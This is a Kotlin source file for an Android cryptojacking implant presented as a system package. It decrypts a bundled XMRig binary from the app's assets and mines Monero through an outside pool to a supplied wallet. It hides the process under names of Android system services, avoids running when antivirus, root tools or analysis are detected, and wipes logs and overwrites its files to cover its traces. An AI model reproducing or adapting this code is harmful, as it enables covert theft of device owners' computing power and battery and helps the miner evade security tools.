package com.google.system

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import kotlinx.coroutines.*
import java.io.*
import java.security.KeyStore
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.math.min
import kotlin.math.max
import kotlin.random.Random
import com.android.internal.os.opsec.MonitorEngine
import com.android.internal.os.opsec.SecurityState
import com.android.internal.os.stealth.StealthEngine

class RealMiner(
    private val context: Context,
    private val wallet: String,
    private val poolHost: String = "pool.supportxmr.com",
    private val poolPort: Int = 3333,
    private val maxThreads: Int = 2,
    private val onStatusUpdate: ((MinerStatus) -> Unit)? = null
) {
    data class MinerStatus(
        val isMining: Boolean,
        val hashrate: Double,
        val sharesAccepted: Long,
        val sharesRejected: Long,
        val uptime: Long,
        val difficulty: Long,
        val poolConnection: Boolean,
        val rawOutput: String
    )

    private var minerProcess: Process? = null
    private var readJob: Job? = null
    private var monitorJob: Job? = null
    private var stealthJob: Job? = null
    @Volatile private var isMining = false
    private var startTime = 0L
    private var currentHashrate = 0.0
    private var sharesAccepted = 0L
    private var sharesRejected = 0L
    private var poolConnected = false
    private var difficulty = 0L
    private var lastOutput = ""
    @Volatile private var pausedForBattery = false
    @Volatile private var currentThreads = maxThreads
    private val startLock = Any()
    private var minerScope: CoroutineScope? = null

    // Maximum stealth: never use more than 2 threads or 30% CPU
    private val stealthMaxThreads = min(maxThreads, 2)
    private var miningIntensity = 0.3f // 30% max CPU

    // Decoy process names - system-looking to avoid suspicion
    private val decoyNames = listOf(
        "com.android.system.update",      // Android system update - very normal
        "com.google.android.gms",           // Google Play Services - very common
        "com.google.process.gapps",        // Google framework
        "android.process.acore",           // Account manager - very common
        "com.android.phone",               // Phone process - essential
        "system_server",                   // Android system server
        "surfaceflinger",                  // Display compositor
        "servicemanager",                  // Service manager
        "vold",                            // Volume daemon
        "netd",                            // Network daemon
        "wpa_supplicant",                  // WiFi daemon
        "mediaserver",                     // Media service
        "audioserver"                      // Audio service
    )
    private var currentDecoyIndex = 0
    @Volatile private var activeDecoyName = decoyNames[0]

    // Stealth timing - random delays to avoid pattern detection
    private val minPollInterval = 30000L  // 30 seconds minimum
    private val maxPollInterval = 90000L    // 90 seconds maximum
    private val minRenameInterval = 180000L // 3 minutes minimum
    private val maxRenameInterval = 600000L // 10 minutes maximum

    // OPSEC thresholds
    private val minBatteryToMine = 25
    private val minBatteryToResume = 35
    private val maxBatteryToPause = 15

    init {
        currentThreads = stealthMaxThreads
    }

    private var lastError = ""

    fun start(): String {
        lastError = ""
        synchronized(startLock) {
            if (isMining) return "Already mining"

            minerScope?.cancel()
            readJob?.cancel()
            monitorJob?.cancel()
            stealthJob?.cancel()
            readJob = null
            monitorJob = null
            stealthJob = null
            isMining = true
        }
        startTime = System.currentTimeMillis()

        val binaryPath = obtainBinary()
        if (binaryPath == null) {
            val err = lastError.ifEmpty { "unknown error" }
            synchronized(startLock) { isMining = false }
            return "No miner binary: $err"
        }

        val configFile = createStealthConfig()

        // Build completely stealthy command
        val cmd = buildStealthCommand(binaryPath, configFile.absolutePath)

        try {
            val proc = Runtime.getRuntime().exec(cmd)
            minerProcess = proc

            // Read PID immediately and close streams
            val pidStr = try {
                proc.inputStream.bufferedReader().use { it.readLine() }
            } catch (_: Exception) { null }

            // Close all streams immediately to avoid leaks
            try { proc.inputStream.close() } catch (_: Exception) {}
            try { proc.outputStream.close() } catch (_: Exception) {}
            try { proc.errorStream.close() } catch (_: Exception) {}

            val pid = pidStr?.trim()?.toLongOrNull()

            if (pid != null) {
                // Immediate rename to decoy name
                renameToDecoy(pid)

                // Schedule periodic renames
                scheduleStealthRenames(pid)
            }

            val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
            minerScope = scope

            // Stealth status monitoring - very slow and random
            readJob = scope.launch {
                while (isActive) {
                    val delayTime = Random.nextLong(minPollInterval, maxPollInterval)
                    delay(delayTime)
                    if (isMining) {
                        silentlyCheckStatus()
                    }
                }
            }

            // Battery and OPSEC monitoring
            monitorJob = scope.launch {
                while (isActive) {
                    delay(20000 + Random.nextLong(10000, 20000))
                    if (isMining) {
                        adaptToConditions()
                    }
                }
            }

            // Periodic stealth maintenance
            stealthJob = scope.launch {
                while (isActive) {
                    val renameDelay = Random.nextLong(minRenameInterval, maxRenameInterval)
                    delay(renameDelay)
                    if (pid != null && isMining) {
                        performStealthMaintenance(pid)
                    }
                }
            }

            return "Mining started"
        } catch (e: Exception) {
            synchronized(startLock) { isMining = false }
            return "Failed: ${e.message}"
        }
    }

    private fun passesDeepOsecCheck(): Boolean {
        try {
            val stealth = StealthEngine.getInstance()
            if (stealth.isRunningUnderAnalysis()) {
                // Detected analysis - don't start
                return false
            }

            val monitor = MonitorEngine.getInstance()
            if (!monitor.shouldExecuteAction()) {
                // OPSEC state doesn't permit action
                return false
            }

            // Check for suspicious apps
            if (isSecurityAppPresent()) {
                return false
            }
        } catch (_: Exception) {}
        return true
    }

    private fun isSecurityAppPresent(): Boolean {
        val securityPackages = listOf(
            "com.antivirus", "com.avast", "com.kms", "com.mcafee",
            "com.norton", "com.eset", "com.lookout", "com.bitdefender",
            "com.trendmicro", "com.symantec", "com.sophos", "com.pandora",
            "com.carlos恶意软件", "com.malware", "com.cline", "de.robv.android.xposed",
            "com.topjohnwu.magisk", "com.koushikdutta.superuser", "eu.chainfire.supersu",
            "com.chelpus.lackypatch", "com.devadvance.rootcloak", "com.ramdroid.appquarantine"
        )

        return securityPackages.any { pkg ->
            try {
                context.packageManager.getPackageInfo(pkg, 0)
                true
            } catch (_: Exception) { false }
        }
    }

    private fun buildStealthCommand(binaryPath: String, configPath: String): Array<String> {
        val logFile = File(context.filesDir, ".miner_log")
        return arrayOf(
            "sh", "-c",
            "chmod 755 $binaryPath && " +
            "echo \$(date) 'Starting miner...' > ${logFile.absolutePath} && " +
            "$binaryPath " +
            "--config=$configPath " +
            "--threads=$currentThreads " +
            "--donate-level=0 " +
            "--randomx-mode=light " +
            "--randomx-wrmsr=0 " +
            "--randomx-no-rdmsr " +
            "--print-time=10 " +
            ">> ${logFile.absolutePath} 2>&1 & " +
            "echo \$! > ${File(context.filesDir, ".miner_pid").absolutePath} && " +
            "cat ${File(context.filesDir, ".miner_pid").absolutePath}"
        )
    }

    private fun getNextDecoyName(): String {
        activeDecoyName = decoyNames[currentDecoyIndex % decoyNames.size]
        currentDecoyIndex++
        return activeDecoyName
    }

    private fun renameToDecoy(pid: Long) {
        try {
            val decoy = getNextDecoyName()

            // Rename process comm (how it appears in ps)
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "echo '$decoy' > /proc/$pid/comm 2>/dev/null")).waitFor()

            // Try to rename cmdline too (harder, may not always work)
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "printf '$decoy\\0' > /proc/$pid/cmdline 2>/dev/null")).waitFor()

            // Hide /proc entries
            try {
                File("/proc/$pid/environ").let { if (it.exists()) it.delete() }
            } catch (_: Exception) {}

            // Set process priority to low (less CPU suspicion)
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "renice +19 $pid 2>/dev/null")).waitFor()

        } catch (_: Exception) {}
    }

    private fun scheduleStealthRenames(pid: Long) {
        minerScope?.launch {
            while (isActive && isMining) {
                delay(Random.nextLong(minRenameInterval, maxRenameInterval))
                if (isMining) {
                    try {
                        renameToDecoy(pid)
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun silentlyCheckStatus() {
        try {
            // Very quiet status check - doesn't log anything
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "pgrep -f 'xmrig|libxmrig|$activeDecoyName' 2>/dev/null | wc -l"))
            val count = proc.inputStream.bufferedReader().use { it.readText().trim().toIntOrNull() ?: 0 }
            proc.waitFor()
            proc.inputStream.close()
            proc.errorStream?.close()

            if (count == 0) {
                synchronized(startLock) {
                    if (isMining) {
                        isMining = false
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun adaptToConditions() {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = batteryManager.isCharging

        // Low battery - pause mining
        if (batteryPct < maxBatteryToPause && !isCharging) {
            if (!pausedForBattery) {
                pausedForBattery = true
                pauseMining()
            }
            return
        }

        // Enough battery or charging - resume if paused
        if ((batteryPct >= minBatteryToResume || isCharging) && pausedForBattery) {
            pausedForBattery = false
            resumeMining()
        }

        // Adaptive intensity based on battery
        when {
            batteryPct < minBatteryToMine && !isCharging -> {
                // Very low battery - pause
                if (!pausedForBattery) {
                    pausedForBattery = true
                    pauseMining()
                }
            }
            batteryPct < 40 && !isCharging -> {
                // Low battery - reduce intensity
                miningIntensity = 0.2f
            }
            isCharging -> {
                // Charging - can use more resources
                miningIntensity = 0.5f
            }
            else -> {
                // Normal - moderate usage
                miningIntensity = 0.3f
            }
        }

        // Check OPSEC state
        try {
            val monitor = MonitorEngine.getInstance()
            when (monitor.state) {
                SecurityState.PARANOID, SecurityState.DORMANT, SecurityState.DEAD -> {
                    pauseMining()
                }
                SecurityState.STEALTH -> {
                    miningIntensity = min(miningIntensity, 0.2f)
                }
                else -> {}
            }
        } catch (_: Exception) {}
    }

    private fun pauseMining() {
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "pkill -STOP -f 'xmrig|libxmrig' 2>/dev/null")).let {
                it.inputStream.close()
                it.errorStream?.close()
            }
        } catch (_: Exception) {}
    }

    private fun resumeMining() {
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "pkill -CONT -f 'xmrig|libxmrig' 2>/dev/null")).let {
                it.inputStream.close()
                it.errorStream?.close()
            }
        } catch (_: Exception) {}
    }

    private fun performStealthMaintenance(pid: Long) {
        try {
            // Re-rename to stay under the radar
            renameToDecoy(pid)

            // Clear any log files that might have been created
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "find /data/local/tmp -name '*xmrig*' -delete 2>/dev/null; " +
                "find /sdcard -name '*xmrig*' -delete 2>/dev/null; " +
                "> /proc/$pid/fd/1 2>/dev/null; " +
                "echo '' > /proc/$pid/fd/2 2>/dev/null"
            )).let {
                it.waitFor()
                it.inputStream.close()
                it.errorStream?.close()
            }

            // Reduce CPU usage by lowering nice value
            try {
                Runtime.getRuntime().exec(arrayOf("sh", "-c",
                    "renice +19 $pid 2>/dev/null")).waitFor()
            } catch (_: Exception) {}

        } catch (_: Exception) {}
    }

    fun stop() {
        synchronized(startLock) { isMining = false }
        minerScope?.cancel()
        readJob?.cancel()
        monitorJob?.cancel()
        stealthJob?.cancel()
        readJob = null
        monitorJob = null
        stealthJob = null
        minerScope = null

        // Silent kill - no logs
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c",
                "pkill -9 -f 'xmrig|libxmrig' 2>/dev/null; " +
                "for p in \$(pgrep -f 'xmrig'); do kill -9 \$p 2>/dev/null; done; " +
                "for p in \$(pgrep -f 'com\\.android.*update.*xmrig'); do kill -9 \$p 2>/dev/null; done"
            )).let {
                it.waitFor()
                it.inputStream.close()
                it.errorStream?.close()
            }
        } catch (_: Exception) {}

        try {
            minerProcess?.destroy()
            minerProcess?.waitFor(2, java.util.concurrent.TimeUnit.SECONDS)
        } catch (_: Exception) {}
        minerProcess = null

        // Delayed cleanup of extracted files
        minerScope = CoroutineScope(Dispatchers.IO)
        minerScope?.launch {
            delay(Random.nextLong(60000, 180000))
            secureDelete()
        }
    }

    private fun secureDelete() {
        try {
            val filesDir = context.filesDir
            filesDir.listFiles()?.forEach { file ->
                if (file.name.startsWith(".") && file.length() > 100000) {
                    // Overwrite with random data then zeros then delete
                    try {
                        val random = ByteArray(1024 * 512)
                        Random.nextBytes(random)
                        FileOutputStream(file).use { fos ->
                            // Multiple overwrite passes
                            repeat(3) {
                                fos.write(random)
                                fos.flush()
                            }
                            // Final zero pass
                            fos.write(ByteArray(1024 * 512))
                            fos.flush()
                        }
                    } catch (_: Exception) {}
                    file.delete()
                }
            }

            // Delete version file
            File(filesDir, ".cache_sys.version").delete()
        } catch (_: Exception) {}
    }

    fun getStatus(): MinerStatus {
        return MinerStatus(
            isMining = isMining && !pausedForBattery,
            hashrate = currentHashrate,
            sharesAccepted = sharesAccepted,
            sharesRejected = sharesRejected,
            uptime = if (startTime > 0 && isMining) System.currentTimeMillis() - startTime else 0,
            difficulty = difficulty,
            poolConnection = poolConnected,
            rawOutput = if (isMining) "Operating normally" else "Idle"
        )
    }

    private fun obtainBinary(): String? {
        val destFile = File(context.filesDir, ".sys_core")
        val cacheVersionFile = File(context.filesDir, ".sys_core.ver")
        val currentVersion = MinerConfig.MINER_AES_KEY.contentToString()

        if (destFile.exists() && destFile.length() > 1000000 && cacheVersionFile.exists()) {
            try {
                val cachedVersion = cacheVersionFile.readText()
                if (cachedVersion == currentVersion) {
                    destFile.setExecutable(true)
                    return destFile.absolutePath
                }
            } catch (_: Exception) {}
        }

        try {
            val blob = ByteArrayOutputStream()
            for (name in MinerConfig.MINER_CHUNK_NAMES) {
                try {
                    context.assets.open(name).use { input ->
                        val buf = ByteArray(65536)
                        var read: Int
                        while (input.read(buf).also { read = it } != -1) {
                            blob.write(buf, 0, read)
                        }
                    }
                } catch (e: Exception) { lastError = "asset_open_failed:$name:${e.message}"; return null }
            }

            val encrypted = blob.toByteArray()
            if (encrypted.size < 28) { lastError = "blob_too_small:${encrypted.size}"; return null }

            val nonce = encrypted.copyOfRange(0, 12)
            val tag = encrypted.copyOfRange(12, 28)
            val ciphertext = encrypted.copyOfRange(28, encrypted.size)

            val keySpec = SecretKeySpec(MinerConfig.MINER_AES_KEY, "AES")
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, keySpec, GCMParameterSpec(128, nonce))
            val decrypted = cipher.doFinal(ciphertext + tag)

            if (decrypted.size < 1000000) { lastError = "decrypted_too_small:${decrypted.size}"; return null }

            FileOutputStream(destFile).use { output ->
                output.write(decrypted)
                output.flush()
            }

            cacheVersionFile.writeText(currentVersion)

            if (!destFile.exists() || destFile.length() < 1000000) {
                destFile.delete()
                lastError = "write_failed:file_missing_or_small"
                return null
            }

            destFile.setExecutable(true)
            return destFile.absolutePath
        } catch (e: Exception) {
            lastError = "exception:${e.javaClass.simpleName}:${e.message}"
            try { destFile.delete() } catch (_: Exception) {}
            return null
        }
    }

    private fun createStealthConfig(): File {
        // Minimal config to reduce detection surface
        val poolJson = org.json.JSONObject().apply {
            put("coin", "XMR")
            put("algo", "rx/0")
            put("url", "$poolHost:$poolPort")
            put("user", wallet)
            put("pass", "x")
            put("rig-id", org.json.JSONObject.NULL)
            put("nicehash", false)
            put("keepalive", true)
            put("enabled", true)
            put("tls", false)
        }

        val root = org.json.JSONObject().apply {
            put("autosave", false)
            put("background", true)
            put("colors", false)
            put("title", false)
            put("randomx", org.json.JSONObject().apply {
                put("init", -1)
                put("mode", "auto")
                put("numa", false)
                put("no_rdmsr", true)
            })
            put("pools", org.json.JSONArray().put(poolJson))
            put("retries", 3)
            put("retry-pause", 3)
            put("syslog", false)
            put("log-file", org.json.JSONObject.NULL)
            put("print-time", 0)
            put("health-print-time", 0)
            put("dmi", false)
            put("cpu", org.json.JSONObject().apply {
                put("enabled", true)
                put("huge-pages", false)
                put("huge-pages-jit", false)
                put("hw-aes", null)
                put("priority", 5) // Low priority - less suspicion
                put("memory-pool", true)
            })
        }

        val configFile = File(context.filesDir, ".sys_cfg")
        configFile.writeText(root.toString(2))
        return configFile
    }

    companion object {
        val KNOWN_SECURITY_APPS = listOf(
            "com.antivirus", "com.avast", "com.kms", "com.mcafee",
            "com.norton", "com.eset", "com.lookout", "com.bitdefender",
            "com.trendmicro", "com.symantec", "com.sophos",
            "de.robv.android.xposed", "com.topjohnwu.magisk"
        )
    }
}